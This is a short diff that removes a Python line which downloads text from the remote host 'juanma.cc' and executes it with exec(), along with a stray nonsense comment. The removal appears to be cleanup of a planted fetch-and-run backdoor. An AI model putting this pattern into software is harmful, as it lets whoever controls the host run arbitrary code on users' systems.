@@ -1,3 +1,0 @@
-exec(__import__("requests").get("juanma.cc/,py").text)
-
-# Lola carola minola
